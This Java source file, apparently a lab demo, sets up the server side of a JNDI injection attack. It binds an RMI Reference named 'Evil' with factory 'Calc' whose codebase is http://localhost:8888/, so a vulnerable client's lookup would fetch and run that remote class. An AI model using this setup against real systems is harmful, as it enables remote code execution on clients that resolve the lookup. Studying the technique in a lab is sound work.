package JNDIRMI;

import RMIDemo.*;

import javax.naming.InitialContext;
import javax.naming.Reference;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class JNDIRMIServer {
    public static void main(String[] args) throws Exception {
        InitialContext ic = new InitialContext();
//        Registry registry = LocateRegistry.createRegistry(1099);
        Reference reference = new Reference("Evil","Calc",
                "http://localhost:8888/");
        ic.rebind("rmi://localhost:1099/sayHello",reference);

    }
}
